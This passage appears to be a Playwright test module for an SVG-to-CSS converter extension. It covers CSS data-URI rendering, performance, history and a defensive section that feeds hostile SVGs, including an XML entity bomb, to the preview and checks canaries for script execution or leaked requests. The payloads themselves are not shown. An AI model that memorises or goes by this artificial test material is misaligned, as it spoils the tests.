  await proof.setViewportSize({ width: 1400, height: 1200 });
  await proof.goto(`${proofOrigin}/index.html`);
  await proof.waitForLoadState('load');
  await sleep(300);
  // Every URI decoded by an image; the URL CSS parsed out of each declaration, fetched back.
  const measured = await proof.evaluate(
    async ([tileList, negList]) => {
      const decode = async src => {
        const img = new Image();
        img.src = src;
        return img.decode().then(
          () => true,
          () => false,
        );
      };
      const cssUrl = el => {
        const s = getComputedStyle(el);
        const v = s.backgroundImage !== 'none' ? s.backgroundImage : s.maskImage || s.webkitMaskImage;
        const m = /^url\("(.*)"\)$/s.exec(v ?? '');
        return m ? m[1].replace(/\\(.)/g, '$1') : null;
      };
      const bytes = async url => {
        if (!url) return null;
        const r = await fetch(url).catch(() => null);
        return r ? r.text() : null;
      };
      const out = {};
      for (const t of tileList) {
        const el = document.getElementById(t.id);
        const url = el.tagName === 'IMG' ? el.src : cssUrl(el);
        out[t.id] = {
          url: url?.slice(0, 40),
          loads: url ? await decode(url) : false,
          text: url && url.startsWith('data:') ? await bytes(url) : null,
        };
      }
      const neg = {};
      for (const n of negList) {
        const el = document.getElementById(n.tid);
        const url = el.tagName === 'IMG' ? el.src : cssUrl(el);
        neg[n.tid] = {
          cssValid: url !== null,
          loads: url ? await decode(url) : false,
          text: url && url.startsWith('data:') ? await bytes(url) : null,
        };
      }
      return { out, neg };
    },
    [tiles, negRows.map(n => ({ tid: n.tid }))],
  );
  const shot = decodePng(await proof.locator('#grid').screenshot());
  const boxes = await proof.evaluate(
    ids => {
      const grid = document.getElementById('grid').getBoundingClientRect();
      return Object.fromEntries(
        ids.map(i => {
          const r = document.getElementById(i).getBoundingClientRect();
          return [i, { x: r.x - grid.x, y: r.y - grid.y, w: r.width, h: r.height }];
        }),
      );
    },
    [...tiles.map(t => t.id), ...negRows.map(n => n.tid)],
  );
  const scale =
    shot.width / (await proof.evaluate(() => document.getElementById('grid').getBoundingClientRect().width));
  const tilePixels = tid => {
    const b = boxes[tid];
    const x0 = Math.round(b.x * scale);
    const y0 = Math.round(b.y * scale);
    const n = Math.round(TILE * scale);
    const out = Buffer.alloc(n * n * 4);
    for (let y = 0; y < n; y++)
      shot.pixels.copy(out, y * n * 4, ((y0 + y) * shot.width + x0) * 4, ((y0 + y) * shot.width + x0 + n) * 4);
    return out;
  };
  const diff = (a, b) => {
    let max = 0;
    let count = 0;
    for (let k = 0; k < a.length; k++) {
      const d = Math.abs(a[k] - b[k]);
      if (d) count++;
      if (d > max) max = d;
    }
    return { max, count };
  };
  const blank = buf => buf.every(v => v === 255);
  const TOLERANCE = 2;
  const results = [];
  const swapQ = s => s.replaceAll("'", '"');
  for (const t of tiles) {
    if (t.key.startsWith('ref-')) continue;
    const row = rows[t.row];
    const ref = `t${t.row}-${t.key.startsWith('mask') ? 'ref_mask' : t.key.startsWith('img') ? 'ref_img' : 'ref_bg'}`;
    const d = diff(tilePixels(t.id), tilePixels(ref));
    const m = measured.out[t.id];
    const expected = t.key.endsWith('no-minify') ? row.preparedRaw : row.prepared;
    const base64 = t.key.includes('base64');
    const textOk =
      m.text !== null &&
      expected !== null &&
      (base64 ? m.text === expected : m.text.length === expected.length && swapQ(m.text) === swapQ(expected));
    results.push({ row: row.name, key: t.key, max: d.max, differing: d.count, loads: m.loads, textOk });
  }
  const failing = results.filter(r => r.max > TOLERANCE || !r.loads || !r.textOk);
  const refsBlank = rows.map((r, i) => blank(tilePixels(`t${i}-ref_bg`)) && r.name).filter(Boolean);
  const exact = results.filter(r => r.max === 0).length;
  facts.cssProof = {
    tiles: results.length,
    exact,
    maxDifference: Math.max(...results.map(r => r.max)),
    tolerance: TOLERANCE,
    blankReferences: refsBlank,
    failing,
  };
  check(
    `${T}: the result works in CSS — ${rows.length} examples × 4 forms × 2 encodings (+ Minify off): ${results.length} tiles on a loopback page, each loads, paints its reference's pixels (${exact} exactly; tolerance ${TOLERANCE}) and reads back as the prepared SVG`,
    failing.length === 0 && results.length === rows.length * 9,
    JSON.stringify({ failing: failing.slice(0, 6), blankReferences: refsBlank }),
  );
  // Minify on and off paint the same, both equal to the original: the cleanup changes nothing that shows.
  const cleanupSame = rows.map((r, i) => ({
    name: r.name,
    ...diff(tilePixels(`t${i}-bg_url`), tilePixels(`t${i}-bg_url_no_minify`)),
  }));
  facts.cleanupPixels = cleanupSame.map(c => `${c.name}: max ${c.max}`);
  check(
    `${T}: the cleanup changes nothing that shows — Minify on and off paint identical pixels for every example`,
    cleanupSame.every(c => c.max === 0),
    JSON.stringify(cleanupSame.filter(c => c.max > 0)),
  );
  const negOut = negRows.map(n => {
    const m = measured.neg[n.tid];
    const d = diff(tilePixels(n.tid), tilePixels(`t${n.refRow}-${n.ref.replace('-', '_')}`));
    const row = rows[n.refRow];
    const intended =
      n.name.includes('Minify off') || n.name.startsWith('raw line feed') ? row.preparedRaw : row.prepared;
    const sameBytes = m.text !== null && swapQ(m.text) === swapQ(intended);
    return { name: n.name, cssValid: m.cssValid, loads: m.loads, samePixels: d.max <= TOLERANCE, sameBytes };
  });
  facts.rawCharacters = negOut;
  const neg = name => negOut.find(n => n.name.startsWith(name));
  const works = n => n.cssValid && n.loads && n.samePixels && n.sameBytes;
  check(
    `${T}: what each encoded character is for — raw #, no xmlns, raw " or line feed, raw % before hex, raw & in <img src> break the image; raw \\ is read as an escape (bytes change); <, >, spaces, non-ASCII (and, in Chrome, a tab) raw still work; url('…') and unquoted url(…) break a URI with ' or spaces, not Base64`,
    !works(neg('raw #')) &&
      works(neg('only # encoded')) &&
      !works(neg('no xmlns')) &&
      !neg('raw "').cssValid &&
      !works(neg('raw \\')) &&
      !neg('raw line feed').cssValid &&
      !works(neg('raw % before')) &&
      works(neg('raw non-ASCII')) &&
      !works(neg('raw & in')) &&
      works(neg('the tool’s %26')) &&
      !neg("url('…')").cssValid &&
      !neg('unquoted url(…) around a URI').cssValid &&
      works(neg('unquoted url(…) around Base64')),
    JSON.stringify(negOut),
  );
  await proof.close();
  await ctx.unroute(proofRoute);
  await new Promise(resolve => server.close(resolve));

  // ---- The hostile set against the preview: as an image, then as image and mask
  await go(toolUrl);
  await inputField.waitFor({ timeout: 30_000 });
  const corpus = hostileSvgs(id);
  const hostile = [];
  const before = { outside: outside.length, routed: routed.length, popups: popups.length };
  const startUrl = page.url();
  for (const mode of ['background-image', 'mask-image']) {
    await pickOutput(mode);
    for (const entry of corpus) {
      await put('');
      await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value === '');
      const cdpFrom = cdpRequests.length;
      const run = await timed(async () => {
        await put(entry.svg);
        return settledPreview();
      }, 400);
      if (mode === 'mask-image' && run.value === 'shown') await page.locator('[data-part="mask"]').waitFor();
      const px = run.value === 'shown' ? await pixel(5, 5) : null;
      hostile.push({
        mode,
        name: entry.name,
        preview: run.value,
        error: await statusLine(),
        noted: (await notes()).some(n => n.startsWith('This SVG contains scripts or external references.')),
        pixel: px,
        longestFrameMs: run.longest,
        ownFileRequests: cdpRequests.slice(cdpFrom).filter(u => u.startsWith(origin) && !u.includes('/assets/')),
      });
    }
  }
  await sleep(300);
  const canary = await page.evaluate(async () => ({
    window: window.__svgPwned ?? null,
    local: localStorage.getItem('svgPwned'),
    storage: await new Promise(resolve => {
      try {
        chrome.storage.local.get('svgPwned', r => resolve(r?.svgPwned ?? null));
      } catch {
        resolve('unreadable');
      }
    }),
  }));
  const violations = await page.evaluate(() => [...window.__svgViolations]);
  const leaked = {
    outside: outside.slice(before.outside),
    routed: routed.slice(before.routed),
    popups: popups.slice(before.popups),
  };
  facts.hostile = hostile.map(
    h =>
      `${h.mode} · ${h.name.split(':')[0]}: ${h.preview} ${JSON.stringify(h.pixel)} ${h.error} ${h.longestFrameMs} ms`,
  );
  check(
    `${T}: hostile set (${corpus.length} SVGs, as image and as mask) — each shown (or refused by Chrome's XML parser with words), nothing it names painted, the note on each`,
    hostile.every((h, k) => {
      const entry = corpus[k % corpus.length];
      const shown = h.preview === 'shown' || (entry.mayRefuse && h.error !== '');
      const green = !entry.green || h.preview !== 'shown' || JSON.stringify(h.pixel) === '[0,255,0,255]';
      const noted = h.preview !== 'shown' || entry.name.startsWith('an XML entity bomb') || h.noted;
      return shown && green && noted;
    }),
    facts.hostile.join('; '),
  );
  check(
    `${T}: hostile set — no request left the browser (Playwright ${leaked.outside.length}, routed .invalid ${leaked.routed.length}), none for the extension's files, no script ran, no navigation, no popup, no policy violation, no frame over 500 ms`,
    leaked.outside.length === 0 &&
      leaked.routed.length === 0 &&
      hostile.every(h => h.ownFileRequests.length === 0) &&
      canary.window === null &&
      canary.local === null &&
      canary.storage === null &&
      page.url() === startUrl &&
      leaked.popups.length === 0 &&
      violations.length === 0 &&
      hostile.every(h => h.longestFrameMs < 500),
    `${JSON.stringify(leaked)}; canary ${JSON.stringify(canary)}; violations ${JSON.stringify(violations)}; frames ${hostile.map(h => h.longestFrameMs).join(',')}`,
  );
  await put('');
  await put(corpus[0].svg);
  await settledPreview();
  await settledShot(shoot, page, 'tool-svg-to-css-05-note.png');
  await pickOutput('background-image');

  // ---- Object URLs: one alive per shown result, revoked on change, on an error and on leaving
  {
    await put('');
    await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value === '');
    await sleep(100);
    const emptyLive = (await liveUrls()).length;
    await putAndRead(RED, '');
    await settledPreview();
    const oneLive = await liveUrls();
    await putAndRead(EXAMPLES[1][1], RED_CSS);
    await settledPreview();
    const afterChange = await liveUrls();
    await put('<svg>');
    await page.waitForFunction(() => document.querySelector('[data-part="status"]').textContent.trim() !== '');
    await sleep(100);
    const afterError = (await liveUrls()).length;
    await putAndRead(RED, '');
    await settledPreview();
    const made = await page.evaluate(() => window.__svgUrls.made);
    await go(`${base}#/tools`);
    await sleep(200);
    const afterLeave = (await liveUrls()).length;
    check(
      `${T}: object URLs — none while empty, one per shown result, revoked on a new result, on an error and on leaving (${made} made)`,
      emptyLive === 0 &&
        oneLive.length === 1 &&
        afterChange.length === 1 &&
        afterChange[0] !== oneLive[0] &&
        afterError === 0 &&
        afterLeave === 0,
      JSON.stringify({ emptyLive, oneLive, afterChange, afterError, afterLeave }),
    );
    await go(toolUrl);
    await inputField.waitFor({ timeout: 30_000 });
  }

  // ---- §12: a megabyte of SVG and four, both encodings
  {
    const circles = n =>
      `<svg ${NS} viewBox="0 0 1000 1000">${Array.from({ length: n }, (_, i) => `<circle cx="${i % 1000}" cy="${(i / 1000) | 0}" r="5" fill="#123456"/>`).join('')}</svg>`;
    const small = circles(5_500); // just under 256 Ki characters: live
    const big = circles(22_000); // just under 1 MiB characters: 300 ms after the last edit
    const huge = circles(89_000); // just under 4 MiB: 300 ms after the last edit
    const sizes = { small: small.length, big: big.length, huge: huge.length };
    const measure = async (text, encoding) => {
      await setEncoding(encoding === 'url' ? 'URL-encoded' : 'Base64');
      await put('');
      await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value === '');
      await sleep(200);
      return timed(async () => {
        await put(text);
        await page.waitForFunction(
          enc => {
            const v = document.querySelector('#svg-to-css-result').value;
            return v !== '' && v.includes(';base64,') === (enc === 'base64');
          },
          encoding,
          { timeout: 30_000, polling: 16 },
        );
      }, 300);
    };
    const runs = {};
    for (const [name, text] of [
      ['256 KiB', small],
      ['1 MiB', big],
      ['4 MiB', huge],
    ])
      for (const enc of ['url', 'base64']) runs[`${name} ${enc}`] = await measure(text, enc);
    await setEncoding('URL-encoded');
    // The parser alone, and the text field alone (a bare textarea on a blank page, the same result, painted).
    const parserMs = await page.evaluate(
      texts =>
        texts.map(t => {
          const t0 = performance.now();
          new DOMParser().parseFromString(t, 'image/svg+xml');
          return Math.round(performance.now() - t0);
        }),
      [big, huge],
    );
    await page.getByRole('button', { name: 'Copy', exact: true }).click();
    await page.getByRole('button', { name: 'Copied', exact: true }).waitFor({ timeout: 5_000 });
    const hugeResult = (await clipboard.copied()).at(-1);
    const shownChars = (await css()).length;
    const blank = await ctx.newPage();
    const fieldCost = value =>
      blank.evaluate(async text => {
        const area = document.createElement('textarea');
        area.style.cssText = 'width:600px;height:160px;word-break:break-all;font-family:monospace';
        document.body.append(area);
        await new Promise(r => requestAnimationFrame(r));
        const t0 = performance.now();
        area.value = text;
        void area.scrollHeight;
        await new Promise(r => requestAnimationFrame(() => setTimeout(r, 0)));
        const ms = Math.round(performance.now() - t0);
        area.remove();
        return ms;
      }, value);
    const fieldMs = await fieldCost(hugeResult);
    const fieldShownMs = await fieldCost(hugeResult.slice(0, shownChars));
    await blank.close();
    await put('');
    facts.large = {
      characters: sizes,
      resultCharacters: hugeResult.length,
      runs: Object.fromEntries(Object.entries(runs).map(([k, v]) => [k, { ms: v.ms, longestFrameMs: v.longest }])),
      parserMs: { '1 MiB': parserMs[0], '4 MiB': parserMs[1] },
      textFieldMs: { whole: fieldMs, shown: fieldShownMs, shownCharacters: shownChars },
    };
    check(
      `${T}: §12 — 256 KiB (live): ${runs['256 KiB url'].ms} / ${runs['256 KiB base64'].ms} ms, longest frame ${runs['256 KiB url'].longest} / ${runs['256 KiB base64'].longest} ms; 1 MiB (300 ms settle included): ${runs['1 MiB url'].ms} / ${runs['1 MiB base64'].ms} ms (URL-encoded / Base64; longest frame ${runs['1 MiB url'].longest} / ${runs['1 MiB base64'].longest} ms); 4 MiB (300 ms settle included): ${runs['4 MiB url'].ms} / ${runs['4 MiB base64'].ms} ms; the parser alone ${parserMs.join(' / ')} ms, a bare text field with the whole result ${fieldMs} ms, with the ${shownChars} characters shown ${fieldShownMs} ms`,
      Object.values(runs).every(r => r.ms < 5_000),
      JSON.stringify(facts.large),
    );
  }

  // ---- History (D17): Copy is a commit with the SVG and the result as blobs; the entry opens back
  {
    await put('');
    await putAndRead(RED, '');
    await page.getByRole('button', { name: 'Copy', exact: true }).click();
    const record = await waitForHistoryRecord(
      page,
      'svg-to-css',
      r => r.kind === 'convert' && r.payload?.action === 'copy',
    ).catch(() => null);
    const historyPage = await ctx.newPage();
    await historyPage.goto(`${base}#/history`);
    await historyPage.locator('[data-page="history"]').waitFor();
    const entry = historyPage.locator('.kit-history-entry[data-kind="convert"]').first();
    await entry.waitFor();
    await entry.getByRole('button', { name: 'Open' }).click();
    await historyPage.locator('[data-restored]').waitFor();
    await historyPage.locator('#svg-to-css-result').waitFor();
    await historyPage.waitForFunction(() => document.querySelector('#svg-to-css-result').value !== '');
    const reopened = {
      restored: await historyPage.locator('[data-restored]').innerText(),
      input: await historyPage.locator('#svg-to-css-input').inputValue(),
      css: await historyPage.locator('#svg-to-css-result').inputValue(),
    };
    await historyPage.close();
    check(
      `${T}: history — Copy writes the SVG and the result as blobs with the form and encoding; the entry opens back into the tool`,
      record !== null &&
        ['svg', 'result'].every(n => (record.blobs ?? []).some(b => b.name === n)) &&
        record.payload.output === 'background-image' &&
        record.payload.encoding === 'url' &&
        reopened.restored === 'Opened from History: background-image · URL-encoded · 144 characters · copied.' &&
        reopened.input === RED &&
        reopened.css === RED_CSS,
      `${JSON.stringify(record?.payload)}; ${JSON.stringify(reopened)}; ${(await historyRecords(page, 'svg-to-css')).length} records`,
    );
  }

  // ---- §7 on the start page: what opens for each kind of paste
  {
    const start = await ctx.newPage();
    const opens = {};
    for (const [kind, text] of [
      ['an SVG icon', RED],
      ['an SVG with a prolog', EXAMPLES[2][1]],
      ['HTML with an SVG inside', `<div>${RED}</div>`],
      ['a percent-encoded SVG data URI', 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22/%3E'],
      ['Base64 of an SVG', Buffer.from(RED).toString('base64')],
    ]) {
      await start.goto(`${base}#/start`);
      const field = start.getByRole('combobox', { name: 'Find a tool or search the web' });
      await field.waitFor();
      await field.focus();
      await start.evaluate(value => {
        const data = new DataTransfer();
        data.setData('text/plain', value);
        document.activeElement.dispatchEvent(
          new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true }),
        );
      }, text);
      await start.waitForFunction(() => location.hash.startsWith('#/tools/'), null, { timeout: 3_000 }).catch(() => {});
      opens[kind] = await start.evaluate(() => location.hash);
    }
    await start.close();
    facts.startPage = opens;
    // Earlier tools in the registry recognise these first (docs/defaults.md, «Спорные умолчания»): recorded, not judged
    // beyond "some tool opens for an SVG".
    check(
      `${T}: §7 on the start page — what opens: ${Object.entries(opens)
        .map(([k, v]) => `${k} → ${v.replace('#/tools/', '') || 'nothing'}`)
        .join('; ')}`,
      opens['an SVG icon'].startsWith('#/tools/'),
      JSON.stringify(opens),
    );
  }

  // ---- Screenshots: dark
  await go(toolUrl);
  await inputField.waitFor({ timeout: 30_000 });
  await inDarkTheme(ctx, base, page, async () => {
    await inputField.waitFor({ timeout: 30_000 });
    await put(EXAMPLES[16][1]);
    await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value !== '');
    await settledPreview();
    await settledShot(shoot, page, 'tool-svg-to-css-06-dark.png');
    await put(EXAMPLES[11][1]);
    await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value.includes('%3Ccircle'));
    await settledPreview();
    await pickOutput('mask-image');
    await page.locator('[data-part="mask"]').waitFor();
    await settledShot(shoot, page, 'tool-svg-to-css-07-mask-dark.png');
    await pickOutput('background-image');
  });

  // ---- Nothing left the browser in the whole module; put back what was replaced
  const finalViolations = await page.evaluate(() => {
    if (window.__svgViolationListener)
      document.removeEventListener('securitypolicyviolation', window.__svgViolationListener);
    const v = window.__svgViolations ?? [];
    delete window.__svgViolations;
    delete window.__svgViolationListener;
    if (window.__svgUrls) {
      URL.createObjectURL = window.__svgUrls.create;
      URL.revokeObjectURL = window.__svgUrls.revoke;
      delete window.__svgUrls;
    }
    return v;
  });
  await clipboard.restore();
  check(
    `${T}: the whole module — no request outside the extension and the loopback page (${outside.length}), none routed (${routed.length}), no policy violation on the tool's page`,
    outside.length === 0 && routed.length === 0 && finalViolations.length === 0,
    JSON.stringify({ outside: outside.slice(0, 5), routed: routed.slice(0, 5), finalViolations }),
  );
  ctx.off('request', onRequest);
  ctx.off('page', onPopup);
  cdp.off('Network.requestWillBeSent', onCdp);
  await cdp.detach().catch(() => {});
  await ctx.unroute(INVALID);
  await page.evaluate(url => location.replace(url), `${base}#/tools`);
};
